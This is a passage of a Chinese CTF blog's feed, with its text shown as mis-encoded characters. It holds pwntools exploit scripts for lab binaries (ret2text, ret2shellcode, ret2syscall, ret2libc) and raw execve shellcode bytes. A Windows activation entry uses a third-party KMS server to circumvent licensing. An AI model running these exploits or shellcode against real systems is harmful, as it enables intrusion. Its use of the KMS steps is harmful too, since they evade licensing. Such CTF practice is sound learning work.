        <content type="html"><![CDATA[<p>åœ¨åšé¢˜è¿‡ç¨‹ä¸­é‡åˆ°äº†å¥½å‡ æ¬¡é‡å®šå‘ï¼Œåœ¨æ­¤ç®€å•äº†è§£ä¸€ä¸‹ã€‚<span id="more"></span></p><p>checksecä¸€ä¸‹<br><img src="/2024/07/10/%E4%B8%80%E4%B8%AAwp%E5%92%8Clinux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%8F%8A%E9%87%8D%E5%AE%9A%E5%90%91/vuln_1.png"><br>64ä½ï¼Œå¼€å¯äº†NX</p><p>ä¸¢åˆ°idaé‡Œ<br><img src="/2024/07/10/%E4%B8%80%E4%B8%AAwp%E5%92%8Clinux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%8F%8A%E9%87%8D%E5%AE%9A%E5%90%91/vuln_2.png"><br>çœ‹åˆ°å…³é—­äº†æ ‡å‡†è¾“å‡º<br>å¹¶ä¸”å­˜åœ¨æ ˆæº¢å‡ºï¼Œåˆçœ‹åˆ°äº†åé—¨å‡½æ•°<br><img src="/2024/07/10/%E4%B8%80%E4%B8%AAwp%E5%92%8Clinux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%8F%8A%E9%87%8D%E5%AE%9A%E5%90%91/vuln_3.png"></p><p>expå¦‚ä¸‹  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'node5.anna.nssctf.cn'</span>,<span class="number">24144</span>)</span><br><span class="line"><span class="comment">#io = process('./vuln')</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./vuln'</span>)</span><br><span class="line"></span><br><span class="line">backdoor = elf.symbols[<span class="string">'b4ckd0or'</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401233</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span> + <span class="number">0x08</span>) + p64(ret) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">'exec 1&gt;&amp;0'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p>æ‰“é€š<br><img src="/2024/07/10/%E4%B8%80%E4%B8%AAwp%E5%92%8Clinux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%8F%8A%E9%87%8D%E5%AE%9A%E5%90%91/vuln_4.png"> </p><hr><ul><li>I/Oé‡å®šå‘é€šå¸¸ä¸FDæœ‰å…³ï¼Œshellçš„FDé€šå¸¸ä¸º10ä¸ªï¼Œå³0ï½9</li><li>ä¸‰ä¸ªå¸¸ç”¨FD(é»˜è®¤ä¸keyboardã€monitorã€monitoræœ‰å…³)</li></ul><table><thead><tr><th>FD</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>0</td><td>stdinï¼Œæ ‡å‡†è¾“å…¥</td></tr><tr><td>1</td><td>stdoutï¼Œæ ‡å‡†è¾“å‡º</td></tr><tr><td>2</td><td>stderrï¼Œæ ‡å‡†é”™è¯¯è¾“å‡º</td></tr></tbody></table><p>0æ˜¯æ ‡å‡†è¾“å…¥ï¼Œ1æ˜¯æ ‡å‡†è¾“å‡ºï¼Œ2æ˜¯æ ‡å‡†é”™è¯¯ã€‚å¦‚æœæ­¤æ—¶å†æ‰“å¼€ä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œå®ƒçš„æ–‡ä»¶æè¿°ç¬¦å°±æ˜¯3ã€‚<br>ç”¨ &lt; æ¥æ”¹å˜è¯»è¿›çš„æ•°æ®ä¿¡é“(stdin)ï¼Œä½¿ä¹‹ä»æŒ‡å®šçš„æ¡£æ¡ˆè¯»è¿›<br>ç”¨ &gt; æ¥æ”¹å˜é€å‡ºçš„æ•°æ®ä¿¡é“(stdout, stderr)ï¼Œä½¿ä¹‹è¾“å‡ºåˆ°æŒ‡å®šçš„æ¡£æ¡ˆ</p><p>æˆ‘ä»¬å¯ä»¥ä¿®æ”¹æ–‡ä»¶æè¿°ç¬¦çš„æŒ‡å‘ï¼Œä¹Ÿå°±æ˜¯é‡å®šå‘ï¼Œä¾‹å¦‚ï¼šexec 1&gt;myputoutï¼Œè€Œexpä¸­çš„exec 1&gt;&amp;0ï¼Œå°†æ ‡å‡†è¾“å‡ºé‡å®šä½åˆ°æ ‡å‡†è¾“å…¥ä¸Šï¼Œè¿™æ ·å°±ç›¸å½“äºé‡æ–°å¯åŠ¨äº†æ ‡å‡†è¾“å‡ºã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://xstarcd.github.io/wiki/shell/exec_redirect.html">https://xstarcd.github.io/wiki/shell/exec_redirect.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> çŸ¥è¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win11proæ¿€æ´»</title>
      <link href="/2024/06/13/win11pro%E6%BF%80%E6%B4%BB/"/>
      <url>/2024/06/13/win11pro%E6%BF%80%E6%B4%BB/</url>
      
        <content type="html"><![CDATA[<p>æ¿€æ´»win11pro <span id="more"></span></p><p>å‡ºç°ç±»ä¼¼ä¸‹é¢çš„é—®é¢˜<br><img src="/2024/06/13/win11pro%E6%BF%80%E6%B4%BB/%E9%97%AE%E9%A2%98.png"></p><p>è§£å†³ï¼š</p><p>æ‰“å¼€æ³¨å†Œè¡¨æ‰¾åˆ°å¦‚ä¸‹è·¯å¾„ä¿®æ”¹SkioRearm<br><img src="/2024/06/13/win11pro%E6%BF%80%E6%B4%BB/Snipaste_2024-06-13_12-01-30.png"></p><p><img src="/2024/06/13/win11pro%E6%BF%80%E6%B4%BB/Snipaste_2024-06-13_12-01-42.png"></p><p>å°†0ä¿®æ”¹ä¸º1</p><p>ç®¡ç†å‘˜ç»ˆç«¯è¿è¡Œ  </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">slmgr /skms kms.org</span><br><span class="line">slmgr /ato</span><br><span class="line"> </span><br><span class="line">(ä¸Šé¢ä¸¤ä¸ªä¸è¡Œï¼Œè¿è¡Œçš„ä¸‹é¢ä¸‰è¡ŒæˆåŠŸï¼)</span><br><span class="line"> </span><br><span class="line">slmgr /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX</span><br><span class="line">slmgr /skms kms.03k.org</span><br><span class="line">slmgr /ato</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> è§£å†³é—®é¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LibcSearcher æŠ¥é”™</title>
      <link href="/2024/03/24/LibcSearcher-%E6%8A%A5%E9%94%99/"/>
      <url>/2024/03/24/LibcSearcher-%E6%8A%A5%E9%94%99/</url>
      
        <content type="html"><![CDATA[<p>åœ¨LibcSearcheræ›´æ–°æ—¶ï¼Œä¼šæŠ¥é”™ã€‚<span id="more"></span></p><p>LibcSearcheræŠ¥é”™Requirements for download or update ubuntu are not met. Please, refer to README.md for installation instructions</p><p>éœ€è¦å®‰è£…zstd</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install zstd</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> è§£å†³é—®é¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¾ƒçŸ­çš„shellcode</title>
      <link href="/2024/03/08/%E8%BE%83%E7%9F%AD%E7%9A%84shellcode/"/>
      <url>/2024/03/08/%E8%BE%83%E7%9F%AD%E7%9A%84shellcode/</url>
      
        <content type="html"><![CDATA[<p>è¾ƒçŸ­çš„shellcode <span id="more"></span></p><p>32ä½ï¼ˆ21å­—èŠ‚ï¼‰<br>\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</p><p>64ä½ï¼ˆ23å­—èŠ‚ï¼‰<br>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f \x05</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LibcSearcher_update</title>
      <link href="/2024/02/29/LibcSearcher-update/"/>
      <url>/2024/02/29/LibcSearcher-update/</url>
      
        <content type="html"><![CDATA[<p>æ›´æ–°LIbcSearcher <span id="more"></span></p><ol><li><pre><code>cd LibcSearcherrm -rf libc-databasegit clone https://github.com/niklasb/libc-database.git</code></pre></li><li><p>cd libc-databaseæ‰§è¡Œ./get</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> è§£å†³é—®é¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu22.04è¿ä¸ä¸Šç½‘</title>
      <link href="/2024/02/06/ubuntu22-04%E8%BF%9E%E4%B8%8D%E4%B8%8A%E7%BD%91/"/>
      <url>/2024/02/06/ubuntu22-04%E8%BF%9E%E4%B8%8D%E4%B8%8A%E7%BD%91/</url>
      
        <content type="html"><![CDATA[<p>æˆ‘çš„ubuntu22.04è€æ˜¯æ— ç¼˜æ— æ•…è¿ä¸ä¸Šç½‘ã€‚<span id="more"></span></p><h4 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo service NetworkManager stop </span><br><span class="line"> </span><br><span class="line">sudo rm /var/lib/NetworkManager/NetworkManager.state </span><br><span class="line"> </span><br><span class="line">sudo service NetworkManager start</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> è§£å†³é—®é¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€äº›pwn</title>
      <link href="/2023/12/05/some-small-pwn-topics/"/>
      <url>/2023/12/05/some-small-pwn-topics/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦<span id="more"></span></p><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>checksec<br><img src="/2023/12/05/some-small-pwn-topics/ret2text0.png"><br>32ä½ï¼Œæœªå¼€å¯canaryï¼Œå¼€å¯äº†NX<br>ä¸¢åˆ°idaé‡Œé¢çœ‹ä¸€ä¸‹<br><img src="/2023/12/05/some-small-pwn-topics/ret2text1.png"></p><p>å¯ä»¥çœ‹åˆ°vulnerableå‡½æ•°é‡Œæœ‰getså‡½æ•°ï¼Œè¯»åˆ°çš„å€¼ä¼ åˆ°bufferé‡Œï¼Œè·ç¦»ebp16ä¸ªå­—èŠ‚å†™exp<br>çœ‹åˆ°getshellå‡½æ•°é¦–åœ°å€ä¸º<br><img src="/2023/12/05/some-small-pwn-topics/ret2text2.png"></p><p><img src="/2023/12/05/some-small-pwn-topics/ret2text3.png"></p><p><img src="/2023/12/05/some-small-pwn-topics/ret2text4.png"></p><p>æ‰“é€šã€‚</p><h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><p>checksecä¸€ä¸‹<br><img src="/2023/12/05/some-small-pwn-topics/ret2shellcode0.png"><br>32ä½æ–‡ä»¶ï¼Œæœªå¼€å¯canaryä¿æŠ¤ï¼Œæœªå¼€å¯PIEï¼Œå…·æœ‰RWXæ®µã€‚</p><p>ä¸¢åˆ°ida<br><img src="/2023/12/05/some-small-pwn-topics/ret2shellcode1.png"><br>å®šä¹‰äº†ä¸€ä¸ªå­—ç¬¦å‹æ•°ç»„sï¼Œgetsè¾“å…¥åˆ°sï¼Œå¹¶å°†sçš„0x64ä½å­—èŠ‚æ•°æ®èµ‹ç»™buf2</p><p>åœ¨gdbä¸­å‘ç°getså‡½æ•°çš„æ ˆå¸§é•¿åº¦ä¸º0x92å­—ï¼Œespå­˜å‚¨çš„æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œå¯ä»¥çœ‹åˆ°æ•°æ®æ˜¯ä»0xffffd01cå¼€å§‹å¡«å……<br><img src="/2023/12/05/some-small-pwn-topics/ret2shellcode2.png"><br>é€šè¿‡pythonå¯ä»¥ç®—å‡ºéœ€è¦å¡«å……108 + 4 ä¸ªåƒåœ¾å­—èŠ‚ï¼Œå†åŠ 4ä¸ªå­—èŠ‚çš„æ•°æ®â€”â€”è¿”å›åœ°å€<br><img src="/2023/12/05/some-small-pwn-topics/ret2shellcode3.png"></p><p>æ‰¾åˆ°å…¨å±€å˜é‡buf2çš„åœ°å€<br><img src="/2023/12/05/some-small-pwn-topics/ret2shellcode4.png"></p><p>å†™è„šæœ¬  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ret2shellcode"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())  </span><br><span class="line"><span class="comment"># asm()å°†å‚æ•°è½¬åŒ–ä¸ºæœºå™¨ç ï¼Œ shellcraft.sh()é»˜è®¤ç”Ÿæˆä¸€ä¸ªé¢å‘x86çš„shellcode</span></span><br><span class="line">buf2_addr = <span class="number">0x0804a080</span></span><br><span class="line">io.senline = (shellcode.ljust(<span class="number">112</span>, <span class="string">b'A'</span>) + p32(buf2_addr))</span><br><span class="line"><span class="comment"># ljust()ä»å·¦å‘å³è°ƒæ•´å¡«å……Aè‡³112</span></span><br><span class="line">io.interactive()             </span><br></pre></td></tr></tbody></table></figure><p>å¾—åˆ°äº†æœ¬åœ°ç¨‹åºçš„shell<br><img src="/2023/12/05/some-small-pwn-topics/ret2shellcode5.png"></p><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>checksec<br><img src="/2023/12/05/some-small-pwn-topics/ret2syscall0.png"><br>çœ‹åˆ°32ä½ç¨‹åºï¼Œå¼€å¯äº†RELRO<br>no ret2text no ret2shellcode<br>ä¸¢åˆ°idaé‡Œ<br><img src="/2023/12/05/some-small-pwn-topics/ret2syscall1.png"></p><p>çœ‹åˆ°gets()å‡½æ•°<br>v4ä¸ebpç›¸è·0x64 = 100<br>gdbåŠ¨æ€è°ƒè¯•ä¸€ä¸‹<br><img src="/2023/12/05/some-small-pwn-topics/ret2syscall5.png">  </p><p>çœ‹åˆ°å¡«å……ä½ç½®ä¸ebpç›¸å·®0xa8 - 0x3c = 108<br>æ‰€ä»¥æœ‰æ—¶å€™idaä¹Ÿä¸å¤ªå‡†<br>åŸºæœ¬ROPï¼Œret2syscallï¼Œé€šè¿‡gadgetsæ„æˆä»£ç æ‹¿åˆ°shell<br><img src="/2023/12/05/some-small-pwn-topics/ret2syscall2.png"><br>ç”¨ROPgadgetæœç´¢åˆ°å¦‚ä¸‹gadgets<br><img src="/2023/12/05/some-small-pwn-topics/ret2syscall3.png">  </p><p><img src="/2023/12/05/some-small-pwn-topics/ret2syscall4.png"></p><p><img src="/2023/12/05/some-small-pwn-topics/ret2syscall7.png"></p><p><img src="/2023/12/05/some-small-pwn-topics/ret2syscall6.png"></p><p>å†™exp  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ret2syscall"</span>)</span><br><span class="line">pop_eax = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806eb90</span></span><br><span class="line">bin_sh = <span class="number">0x080BE408</span></span><br><span class="line">int_80 = <span class="number">0x08049421</span></span><br><span class="line">payload = flat([<span class="string">b'A'</span>*(<span class="number">108</span> + <span class="number">4</span>), pop_eax, <span class="number">0xb</span>, pop_edx_ecx_ebx, <span class="number">0</span>, <span class="number">0</span>, bin_sh, int_80 ])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/12/05/some-small-pwn-topics/ret2syscall8.png"></p><p>æ‰“é€šï¼</p><p>tipï¼š  </p><blockquote><p>åœ¨ç¬”è€…å­¦ä¹ è¿™ä¸ªpayloadæ—¶ï¼Œç–‘æƒ‘0xbä¸ºä»€ä¹ˆå¯ä»¥ç›´æ¥ä¼ é€’ï¼Œæœé›†äº†ä¸€ä¸‹ä¿¡æ¯ï¼Œä»¥åæ…¢æ…¢å­¦ã€‚ï¼ˆdogeï¼‰</p><p>åœ¨è¿™ä¸ªæ ˆæº¢å‡ºæ”»å‡»ä¸­ï¼Œ<code>0xb</code> å’Œ <code>"/bin/sh"</code> ä¹‹é—´çš„åŒºåˆ«æ¶‰åŠåˆ°ç³»ç»Ÿè°ƒç”¨å·å’Œå­—ç¬¦ä¸²çš„å­˜å‚¨æ–¹å¼ã€‚</p><ol><li><strong>ç³»ç»Ÿè°ƒç”¨å·ï¼ˆsyscall numberï¼‰ï¼š</strong></li></ol><ul><li><code>0xb</code> æ˜¯ç³»ç»Ÿè°ƒç”¨å·ï¼Œå¯¹åº”äº <code>execve</code> ç³»ç»Ÿè°ƒç”¨ã€‚åœ¨x86ä½“ç³»ç»“æ„ä¸­ï¼Œ<code>0xb</code> å¯¹åº”äº <code>sys_execve</code>ã€‚</li><li>ç³»ç»Ÿè°ƒç”¨å·é€šå¸¸ç›´æ¥ä½œä¸ºå‚æ•°ä¼ é€’ç»™EAXå¯„å­˜å™¨ï¼Œå› æ­¤å¯ä»¥ç›´æ¥æ”¾åœ¨ROPé“¾ä¸­ã€‚</li></ul><ol start="2"><li><strong>å­—ç¬¦ä¸² â€œ/bin/shâ€ï¼š</strong></li></ol><ul><li><code>"/bin/sh"</code> æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå­˜å‚¨åœ¨å†…å­˜ä¸­çš„æŸä¸ªä½ç½®ã€‚åœ¨ROPæ”»å‡»ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å°†è¯¥å­—ç¬¦ä¸²çš„åœ°å€ä¼ é€’ç»™ <code>execve</code> ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°ä¹‹ä¸€ã€‚</li><li>å­—ç¬¦ä¸²æœ¬èº«çš„å†…å®¹ä¸é€‚åˆç›´æ¥æ”¾åœ¨ROPé“¾ä¸­ï¼Œå› ä¸ºROPé“¾éœ€è¦æ˜¯ä¸€ç³»åˆ—çš„åœ°å€ã€‚æ‰€ä»¥æˆ‘ä»¬å°†å­—ç¬¦ä¸²çš„åœ°å€æ”¾åœ¨ROPé“¾ä¸­ï¼Œç„¶å <code>execve</code> åœ¨æ‰§è¡Œæ—¶ä¼šè¯»å–è¯¥åœ°å€å¤„çš„å­—ç¬¦ä¸²ã€‚</li></ul></blockquote><h1 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h1><p>checksec<br><img src="/2023/12/05/some-small-pwn-topics/ret2libc10.png"><br>32ä½ç¨‹åºï¼Œæœªå¼€å¯canaryï¼Œæœªå¼€å¯PIEï¼Œå¼€å¯äº†æ ˆä¸å¯æ‰§è¡Œã€‚<br>ä¸¢åˆ°idaé‡Œ<br><img src="/2023/12/05/some-small-pwn-topics/ret2libc11.png"><br>å‘ç°å±é™©å‡½æ•°gets()<br><img src="/2023/12/05/some-small-pwn-topics/ret2libc12.png"><br>å‡½æ•°secure()æœ‰ä¸€ä¸ªsystem()å‡½æ•°ä½†æ˜¯å‘½ä»¤â€shell!?â€æ²¡æœ‰ä»»ä½•ä½œç”¨ï¼Œä½†æ˜¯ç”±äºsystem()å‡½æ•°çš„è°ƒç”¨ï¼Œåœ¨pltè¡¨é‡Œä¼šæœ‰system()å‡½æ•°å¯¹åº”çš„gotè¡¨åœ°å€çš„è¡¨é¡¹ï¼Œè¿›è€Œèƒ½è§£æå‡ºsystem()å‡½æ•°çš„çœŸå®åœ°å€ï¼Œä»è€Œè°ƒç”¨system()å‡½æ•°ã€‚</p><p><img src="/2023/12/05/some-small-pwn-topics/ret2libc13.png"></p><p>éœ€è¦å¡«å……108 + 4 = 112ä¸ªåƒåœ¾æ•°æ®<br>å†™exp  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">system_addr = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">bin_sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line"><span class="comment"># payload = b"a" * 112 + p32(system_addr) + b"aaaa" + p32(bin_sh_addr)</span></span><br><span class="line">payload = flat([<span class="string">b"a"</span>*<span class="number">112</span>, system_addr, <span class="string">b"aaaa"</span>, bin_sh_addr])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/12/05/some-small-pwn-topics/ret2libc14.png"></p><p>æ‰“é€šï¼</p><h1 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h1><p>checksec<br><img src="/2023/12/05/some-small-pwn-topics/ret2libc20.png"><br>32ä½ç¨‹åºï¼Œæœªå¼€å¯äº†canaryå’ŒPIEï¼Œå¼€å¯äº†éƒ¨åˆ†RELROå’Œæ ˆä¸å¯æ‰§è¡Œã€‚</p><p>æ²¡æœ‰åé—¨å‡½æ•°ï¼Œä¹Ÿæ²¡æœ‰è¶³å¤Ÿçš„gadgetsã€‚</p><p>æ²¡æœ‰æ‰¾åˆ°â€/bin/shâ€<br><img src="/2023/12/05/some-small-pwn-topics/ret2libc21.png"><br><img src="/2023/12/05/some-small-pwn-topics/ret2libc22.png"><br>åœ¨å…¨å±€åŒºæ‰¾åˆ°äº†å…¨å±€å˜é‡buf2ï¼Œå¯ä»¥åŠ«æŒç¨‹åºæµåˆ°buf2å†™å…¥â€/bin/shâ€å†è¿›è¡ŒROP</p><p>payloadçš„ç»“æ„å¦‚ä¸‹<br><img src="/2023/12/05/some-small-pwn-topics/ret2libc23.png"><img src="/2023/12/05/some-small-pwn-topics/ret2libc24.png"></p><p>è¦å¡«å……0x78 - 0x0c + 4 = 108 + 4 = 112ä¸ªåƒåœ¾æ•°æ®<br>å†™exp  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">system_addr = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">gets_addr = elf.plt[<span class="string">"gets"</span>]</span><br><span class="line">buf2_addr = <span class="number">0x0804A080</span></span><br><span class="line">payload = flat([<span class="string">b"a"</span>*<span class="number">112</span>, gets_addr, system_addr, buf2_addr, buf2_addr])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p> <img src="/2023/12/05/some-small-pwn-topics/ret2libc25.png"></p><p>æ‰“é€šï¼</p><h1 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h1><p>çœ‹åˆ°æœ‰ä¸¤ä¸ªæ–‡ä»¶</p><p>checksec ret2libc3<br><img src="/2023/12/05/some-small-pwn-topics/ret2libc30.png"><br>32ä½ï¼Œæœªå¼€å¯canaryå’ŒPIE</p><p>ä¸¢åˆ°idaé‡Œ<br><img src="/2023/12/05/some-small-pwn-topics/ret2libc31.png"><br>æ²¡æœ‰æ‰¾åˆ°åé—¨å‡½æ•°ï¼Œåˆæ²¡æœ‰RWXæ®µæ— æ³•ret2textå’Œret2shellcodeï¼Œè€Œä¸”æ²¡æœ‰è¶³å¤Ÿçš„gadgetæ‰€ä»¥ä¹Ÿæ— æ³•ç”¨ret2syscallï¼Œåªèƒ½ç”¨ret2libcã€‚<br><img src="/2023/12/05/some-small-pwn-topics/ret2libc32.png"><br>æ ˆæº¢å‡ºæ¼æ´åœ¨ç¬¬äºŒä¸ªread</p><p>æ ˆç»“æ„å¦‚ä¸‹<br><img src="/2023/12/05/some-small-pwn-topics/ret2libc33.png"></p><p>æ­¤å¤„ç¬”è€…é‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œé¢˜ä¸­ç»™çš„libcæ–‡ä»¶å’Œå®é™…ç¨‹åºçš„æ‰€ç”¨çš„libcæ–‡ä»¶ä¸ä¸€æ ·æ‰€ä»¥åˆ†æé¢˜ä¸­æ‰€ç»™çš„libcæ–‡ä»¶æ˜¯æ— æ³•æ‰“é€šçš„ï¼Œå¯ä»¥åˆ©ç”¨ldd -v ret2libc3æ¥æŸ¥çœ‹ç¨‹åºæ‰€ç”¨çš„libcæ–‡ä»¶<br><img src="/2023/12/05/some-small-pwn-topics/ret2libc36.png"><br>å¯ä»¥çœ‹åˆ°æ‰€ç”¨çš„libcä¸º<code>libc.so.6</code>å…¶è·¯å¾„ä¸º<code>/lib/i386-linux-gnu/libc.so.6</code><br>å†™exp  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">"i386"</span>, os = <span class="string">"linux"</span>, log_level = <span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line">puts_address = elf.got[<span class="string">b"puts"</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>, <span class="built_in">str</span>(puts_address))</span><br><span class="line">io.recvuntil(<span class="string">b" : "</span>)</span><br><span class="line">puts_address_real = <span class="built_in">int</span>(io.recvuntil(<span class="string">b"\n"</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libbase = puts_address_real - libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">system_address = libc.symbols[<span class="string">"system"</span>] + libbase</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">success(<span class="string">"system_address -&gt; {:#x}"</span>.<span class="built_in">format</span>(system_address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">payload = flat(cyclic(<span class="number">60</span>), system_address, <span class="string">"aaaa"</span>, <span class="built_in">next</span>(elf.search(<span class="string">b"sh\x00"</span>)))</span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>, payload)</span><br><span class="line"></span><br><span 